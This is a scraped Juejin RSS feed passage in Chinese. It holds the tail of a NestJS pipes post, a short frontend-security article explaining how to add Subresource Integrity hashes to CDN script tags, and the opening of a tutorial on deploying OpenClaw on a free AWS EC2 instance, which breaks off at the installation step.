<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31fd56d1104340be8180888a1679d598~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=NTBPoEkh%2FmrGNqlF3dPhbMuwqtw%3D" alt="image.png" loading="lazy"/></p>
<p>使用</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76cbe20df92f4e45a8e9ca4fdacba949~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=bJdJ4Nl02vEaCeoGxDDQ%2F7aNzLM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f9fe0edd188473991d4f42d5cc22565~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=5HTdu2uBxViYdwOJaxcw%2FALSF3w%3D" alt="image.png" loading="lazy"/></p>
<p>返回的值是 aaaaaa，也就是说 pipe 的返回值就是传给 handler 的参数值。</p>
<p>打印的 value 就是 query、param 的值，而 metadata 里包含 type、metatype、data</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/036a95f40e0c43c58162810e3998c6a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=UecdIPPq9hR5Iyk7glen%2BOWPNPA%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端代码安全 - 你的代码真的安全吗？]]></title>    <link>https://juejin.cn/post/7602135278665252916</link>    <guid>https://juejin.cn/post/7602135278665252916</guid>    <pubDate>2026-02-03T02:45:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602135278665252916" data-draft-id="7602161364892090368" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端代码安全 - 你的代码真的安全吗？"/> <meta itemprop="keywords" content="前端,安全"/> <meta itemprop="datePublished" content="2026-02-03T02:45:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="梅川_酷子"/> <meta itemprop="url" content="https://juejin.cn/user/1488075996274921"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端代码安全 - 你的代码真的安全吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1488075996274921/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    梅川_酷子
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T02:45:41.000Z" title="Tue Feb 03 2026 02:45:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">安全检测</h2>
<p>  近期线上代码安全检测遇到一些问题反馈，都是一些开发中不常见、不显现的问题。所以记录一下，了解一些新的安全防护的方法，方便日后开发中能够未雨绸缪。</p>
<h3 data-id="heading-1">SRI 检查</h3>
<p>Subresource Integrity （子资源完整性）</p>
<h4 data-id="heading-2">问题代码：</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcdn.net/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">修改后的代码</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 此代码中 integrity 值不可直接使用 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>
  <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcdn.net/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js"</span>
  <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha384-FwzUI3CDd**************FBTolvoj"</span>
  <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>
&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-4">修改方式</h4>
<h6 data-id="heading-5">1. 在线工具 SRI Hash Generator</h6>
<p>地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsrihash.org%2F" target="_blank" title="https://srihash.org/" ref="nofollow noopener noreferrer">srihash.org/</a></p>
<h6 data-id="heading-6">2. 命令行</h6>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载外部资源</span>
curl -O https://cdn.bootcdn.net/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生成 integrity 的值</span>
node -e <span class="hljs-string">"const fs = require('fs'); const crypto = require('crypto'); const hash = crypto.createHash('sha384').update(fs.readFileSync('jsencrypt.min.js')).digest('base64'); console.log('sha384-' + hash)"</span>
</code></pre>
<p><sup><a href="#user-content-fn-1" id="user-content-user-content-fnref-1" data-footnote-ref="" aria-describedby="footnote-label" title="#user-content-fn-1">1</a></sup>跳转至代码翻译</p>
<h4 data-id="heading-7">使用注意事项</h4>
<p>integrity：核心校验属性，格式为 算法名-Base64哈希值，支持的算法：sha256、sha384、sha512（推荐 sha384/sha512，安全性更高）；</p>
<p>crossorigin：跨域资源必填，不填的话浏览器不校验。常用 anonymous（不发送凭据），几乎不用 use-credentials（发送凭据）。</p>
<h4 data-id="heading-8">详细原因</h4>
<p>用于资源完整性校验，保证用户浏览器每次获取外部资源时，得到的都是原封不动资源，防止恶意篡改</p>
<p><strong>一本正经：</strong><br/>
原理：intergrity 的值，是算法名，加上根据资源源代码，通过算法，生成的 hash 值<br/>
算法的目标代码不同，生成的 hash 值也就不同<br/>
在 script 标签中加入这个属性后，标签在获取到外部资源时，会自动对获取的资源通过算法生成 hash 值<br/>
用新生成的 hash 值，与 intergrity 的属性值做对比：<br/>
相同，表示资源无变动，安全；不同，表示资源有变动，丢弃该资源</p>
<p><strong>通俗大白话：</strong><br/>
通俗讲，就是提前告诉浏览器：我要的东西，用这个算法，会得到这个结果。<br/>
浏览器：知道了，等我运行的时候，拿到东西我先算一下，看结果一样不，一样我再用，不一样我就扔了。</p>
<h3 class="sr-only" id="user-content-footnote-label" data-id="heading-9">Footnotes</h3>
<ol>
<li id="user-content-user-content-fn-1">
<p><strong>代码翻译</strong></p>
<p>整个命令是 Node.js 的-e参数用法（-e = --eval，表示执行后面的字符串代码），核心依赖 Node.js 内置的fs（文件系统）和crypto（加密）模块，无需额外安装依赖：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 引入Node.js内置模块，无需npm install</span>
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>) <span class="hljs-comment">// 用于读取本地文件内容</span>
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>) <span class="hljs-comment">// 用于生成加密哈希值</span>

<span class="hljs-comment">// 2. 生成SHA-384哈希并Base64编码</span>
<span class="hljs-keyword">const</span> hash = crypto
  .<span class="hljs-title function_">createHash</span>(<span class="hljs-string">'sha384'</span>) <span class="hljs-comment">// 创建SHA-384哈希计算实例</span>
  .<span class="hljs-title function_">update</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'jsencrypt.min.js'</span>)) <span class="hljs-comment">// 读取文件内容并传入哈希实例</span>
  .<span class="hljs-title function_">digest</span>(<span class="hljs-string">'base64'</span>) <span class="hljs-comment">// 计算哈希并输出Base64格式（SRI要求的编码格式）</span>

<span class="hljs-comment">// 3. 拼接SRI规范格式并打印</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'sha384-'</span> + hash)
</code></pre>
<a href="#user-content-fnref-1" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content" title="#user-content-fnref-1">↩</a>
</li>
</ol>
</div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[教你零成本使用满血 Clawdbot，并手把手带你集成飞书和Telegram]]></title>    <link>https://juejin.cn/post/7601770028279037961</link>    <guid>https://juejin.cn/post/7601770028279037961</guid>    <pubDate>2026-02-02T05:58:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601770028279037961" data-draft-id="7601762468201938970" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="教你零成本使用满血 Clawdbot，并手把手带你集成飞书和Telegram"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-02T05:58:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            教你零成本使用满血 Clawdbot，并手把手带你集成飞书和Telegram
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-02T05:58:14.000Z" title="Mon Feb 02 2026 05:58:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>OpenClaw最近热度很高，最早叫做 Clawdbot，后来改名Moltbot，现在叫 OpenClaw 了。</p>
<p>很多人早已用上了，查数据、做调研、写代码，但是还有些朋友想用但是还没体验上。</p>
<p>OpenClaw 能够像人一样操控电脑和浏览器，成为我们的私人 AI 助理。</p>
<p>但在安装这一步，很多人犯了难。是跑在自己电脑上？还是挂在云端？到底有对自己有没有帮助？</p>
<p>今天介绍一种不用花钱的方式快速安装，如果有用呢，那就可以直接用了；如果发现用处不大，那也不用浪费钱买个新电脑或者买云服务了。</p>
<p>本文包括快速安装教程，以及详细的配置 Telegram 和 飞书集成的步骤，如果AWS你不想用，没关系，教程在任何机器上都是通用的。</p>
<p>AWS 免费部署</p>
<p>现在只要注册，就可以免费使用 6 个月，可以选择 8G 内存的服务器使用，这可是一年几千块配置的服务器啊。</p>
<p>访问下面地址注册账号，选择免费计划。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2F" target="_blank" title="https://aws.amazon.com/" ref="nofollow noopener noreferrer">aws.amazon.com/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90c2c7ca47874c3f9b5f99dff0ed9e14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=sOKaBw6EJbpmmOZ8CgZLrxWf8ps%3D" alt="" loading="lazy"/></p>
<p>之后进入控制台，搜索 EC2。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f1dc6026b804701aee5057a6b9c7883~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=XL%2FB40IYBvepeKD3SqM%2ByyKg%2FAQ%3D" alt="" loading="lazy"/></p>
<p>点击启动实例，这一步之后就开始选服务器配置了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e94a798e74d4f18aae48ec19d7ff4c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=Xs59UPxPR86mIWITt8P2RgjpfKY%3D" alt="" loading="lazy"/></p>
<p>选择任意后面写着「符合条件的免费套餐」都不用付费，当然选8g内存的这个了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92f3694fe093428fbd35ce31f042be59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=1GG3nfdj9e6J0v62EnTkVwepX38%3D" alt="" loading="lazy"/></p>
<p>镜像选择 Ubuntu，然后启动实例，服务器就到手了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90561ef81b4e4557b3e5ff8bd5a15a81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=5ovpMZ0DUuG3IiybqHzM0CXYQmU%3D" alt="" loading="lazy"/></p>
<p>接下来，选择连接到实例。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a094354bde8d40abba27321990a0d092~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=PB%2FMsYNK3Q666gNK9F6MZkOorqU%3D" alt="" loading="lazy"/></p>
<p>有好几种连接方式，最简单的就是第一种，直接点连接按钮就可以了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c50b35a9001f4e2db5185bc9fbd20c5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=1JNqTsc5Fmcu8Z4VIghwOOBcawY%3D" alt="" loading="lazy"/></p>
<p>连接之后就是服务器的命令行窗口，后面的安装就在这里进行了。</p>
<p>安装</p>
